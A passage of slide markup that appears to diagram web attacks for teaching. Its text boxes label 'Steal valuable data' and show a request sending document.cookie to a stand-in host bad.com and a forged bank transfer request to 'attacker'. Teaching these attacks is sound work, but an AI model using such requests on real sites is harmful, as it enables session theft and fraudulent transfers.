              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1588"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1677">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165921" name="object 38"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4415118" y="4564997"/>
            <a:ext cx="295556" cy="343180"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 45585456 w 272414"/>
              <a:gd name="T1" fmla="*/ 595544232 h 272414"/>
              <a:gd name="T2" fmla="*/ 47508789 w 272414"/>
              <a:gd name="T3" fmla="*/ 906634298 h 272414"/>
              <a:gd name="T4" fmla="*/ 47046711 w 272414"/>
              <a:gd name="T5" fmla="*/ 1216306691 h 272414"/>
              <a:gd name="T6" fmla="*/ 44400503 w 272414"/>
              <a:gd name="T7" fmla="*/ 1502781087 h 272414"/>
              <a:gd name="T8" fmla="*/ 39771554 w 272414"/>
              <a:gd name="T9" fmla="*/ 1744256006 h 272414"/>
              <a:gd name="T10" fmla="*/ 33361173 w 272414"/>
              <a:gd name="T11" fmla="*/ 1918919117 h 272414"/>
              <a:gd name="T12" fmla="*/ 25970880 w 272414"/>
              <a:gd name="T13" fmla="*/ 1999902509 h 272414"/>
              <a:gd name="T14" fmla="*/ 18614535 w 272414"/>
              <a:gd name="T15" fmla="*/ 1980440337 h 272414"/>
              <a:gd name="T16" fmla="*/ 11809194 w 272414"/>
              <a:gd name="T17" fmla="*/ 1869045390 h 272414"/>
              <a:gd name="T18" fmla="*/ 6072788 w 272414"/>
              <a:gd name="T19" fmla="*/ 1674197693 h 272414"/>
              <a:gd name="T20" fmla="*/ 1923570 w 272414"/>
              <a:gd name="T21" fmla="*/ 1404345307 h 272414"/>
              <a:gd name="T22" fmla="*/ 0 w 272414"/>
              <a:gd name="T23" fmla="*/ 1093253912 h 272414"/>
              <a:gd name="T24" fmla="*/ 461950 w 272414"/>
              <a:gd name="T25" fmla="*/ 783586369 h 272414"/>
              <a:gd name="T26" fmla="*/ 3108237 w 272414"/>
              <a:gd name="T27" fmla="*/ 497108759 h 272414"/>
              <a:gd name="T28" fmla="*/ 7737063 w 272414"/>
              <a:gd name="T29" fmla="*/ 255636144 h 272414"/>
              <a:gd name="T30" fmla="*/ 14147880 w 272414"/>
              <a:gd name="T31" fmla="*/ 80968151 h 272414"/>
              <a:gd name="T32" fmla="*/ 21537695 w 272414"/>
              <a:gd name="T33" fmla="*/ 0 h 272414"/>
              <a:gd name="T34" fmla="*/ 28894262 w 272414"/>
              <a:gd name="T35" fmla="*/ 19447006 h 272414"/>
              <a:gd name="T36" fmla="*/ 35699519 w 272414"/>
              <a:gd name="T37" fmla="*/ 130845964 h 272414"/>
              <a:gd name="T38" fmla="*/ 41436013 w 272414"/>
              <a:gd name="T39" fmla="*/ 325692975 h 272414"/>
              <a:gd name="T40" fmla="*/ 45585456 w 272414"/>
              <a:gd name="T41" fmla="*/ 595544232 h 27241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72414" h="272414">
                <a:moveTo>
                  <a:pt x="260986" y="80998"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="271999" y="123308"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="269353" y="165426"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="254203" y="204388"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="227701" y="237230"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="191000" y="260986"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="148690" y="271999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106572" y="269353"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67610" y="254203"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34769" y="227701"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11012" y="191000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="148690"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2645" y="106572"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17795" y="67610"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44297" y="34768"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80999" y="11012"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="123308" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="165426" y="2645"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="204388" y="17795"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="237230" y="44297"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="260986" y="80998"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="9822">
            <a:solidFill>
              <a:srgbClr val="C82506"/>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="20" name="Straight Arrow Connector 19"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4063534" y="4216214"/>
            <a:ext cx="3471022" cy="1431551"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="object 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4455740" y="6023162"/>
            <a:ext cx="5668775" cy="246081"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF200"/>
          </a:solidFill>
          <a:ln w="3175">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="15101" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="26851">
              <a:spcBef>
                <a:spcPts val="119"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" spc="-44" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:hlinkClick r:id="rId10"/>
              </a:rPr>
              <a:t>http://bank.com/transfer?amt=9999&amp;to=attacker</a:t>
            </a:r>
            <a:endParaRPr sz="1500" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="object 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2099703" y="1364317"/>
            <a:ext cx="4868956" cy="242692"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF200"/>
          </a:solidFill>
          <a:ln w="3175">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="11745" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="27969">
              <a:spcBef>
                <a:spcPts val="93"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" spc="-53" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:hlinkClick r:id="rId11"/>
              </a:rPr>
              <a:t>http://bad.com/steal?c=document.cookie</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="object 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="20640000">
            <a:off x="4798920" y="2318796"/>
            <a:ext cx="1937217" cy="179536"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1363"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="-18" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Steal </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2471" spc="6" baseline="1792" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>valuable</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2471" spc="-99" baseline="1792" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2471" spc="19" baseline="5376" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>data</a:t>
            </a:r>
            <a:endParaRPr sz="2471" baseline="5376" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165926" name="object 34"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-1020000">
            <a:off x="4622427" y="2586820"/>
            <a:ext cx="238125" cy="205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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1588"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1677">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165927" name="object 33"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4549589" y="2554942"/>
            <a:ext cx="238125" cy="238125"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 187268 w 270510"/>
              <a:gd name="T1" fmla="*/ 13618 h 270510"/>
              <a:gd name="T2" fmla="*/ 220082 w 270510"/>
              <a:gd name="T3" fmla="*/ 38412 h 270510"/>
              <a:gd name="T4" fmla="*/ 242703 w 270510"/>
              <a:gd name="T5" fmla="*/ 71035 h 270510"/>
              <a:gd name="T6" fmla="*/ 254258 w 270510"/>
              <a:gd name="T7" fmla="*/ 108627 h 270510"/>
              <a:gd name="T8" fmla="*/ 253862 w 270510"/>
              <a:gd name="T9" fmla="*/ 148325 h 270510"/>
              <a:gd name="T10" fmla="*/ 240639 w 270510"/>
              <a:gd name="T11" fmla="*/ 187268 h 270510"/>
              <a:gd name="T12" fmla="*/ 215843 w 270510"/>
              <a:gd name="T13" fmla="*/ 220082 h 270510"/>
              <a:gd name="T14" fmla="*/ 183222 w 270510"/>
              <a:gd name="T15" fmla="*/ 242703 h 270510"/>
              <a:gd name="T16" fmla="*/ 145630 w 270510"/>
              <a:gd name="T17" fmla="*/ 254258 h 270510"/>
              <a:gd name="T18" fmla="*/ 105933 w 270510"/>
              <a:gd name="T19" fmla="*/ 253862 h 270510"/>
              <a:gd name="T20" fmla="*/ 66987 w 270510"/>
              <a:gd name="T21" fmla="*/ 240640 h 270510"/>
              <a:gd name="T22" fmla="*/ 34175 w 270510"/>
              <a:gd name="T23" fmla="*/ 215843 h 270510"/>
              <a:gd name="T24" fmla="*/ 11553 w 270510"/>
              <a:gd name="T25" fmla="*/ 183222 h 270510"/>
              <a:gd name="T26" fmla="*/ 0 w 270510"/>
              <a:gd name="T27" fmla="*/ 145630 h 270510"/>
              <a:gd name="T28" fmla="*/ 393 w 270510"/>
              <a:gd name="T29" fmla="*/ 105933 h 270510"/>
              <a:gd name="T30" fmla="*/ 13618 w 270510"/>
              <a:gd name="T31" fmla="*/ 66987 h 270510"/>
              <a:gd name="T32" fmla="*/ 38412 w 270510"/>
              <a:gd name="T33" fmla="*/ 34176 h 270510"/>
              <a:gd name="T34" fmla="*/ 71035 w 270510"/>
              <a:gd name="T35" fmla="*/ 11553 h 270510"/>
              <a:gd name="T36" fmla="*/ 108627 w 270510"/>
              <a:gd name="T37" fmla="*/ 0 h 270510"/>
              <a:gd name="T38" fmla="*/ 148325 w 270510"/>
              <a:gd name="T39" fmla="*/ 393 h 270510"/>
              <a:gd name="T40" fmla="*/ 187268 w 270510"/>
              <a:gd name="T41" fmla="*/ 13618 h 27051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70510" h="270510">
                <a:moveTo>
                  <a:pt x="199069" y="14475"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="233949" y="40833"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="257996" y="75512"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="270278" y="115472"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="269858" y="157671"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="255802" y="199069"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="229444" y="233949"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="194765" y="257996"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="154806" y="270278"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112607" y="269858"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71208" y="255803"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36328" y="229444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12281" y="194765"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="154806"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="419" y="112607"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14475" y="71208"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40833" y="36329"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="75512" y="12281"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="115472" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="157671" y="419"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="199069" y="14475"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="9822">
            <a:solidFill>
              <a:srgbClr val="C82506"/>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="22" name="Straight Arrow Connector 21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4063534" y="1949824"/>
            <a:ext cx="3471022" cy="1166813"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="object 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="4430526"/>
            <a:ext cx="1484779" cy="831028"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2634" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="21"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="78572" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165930" name="object 18"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8072439" y="2910729"/>
            <a:ext cx="1318091" cy="12850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58738">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
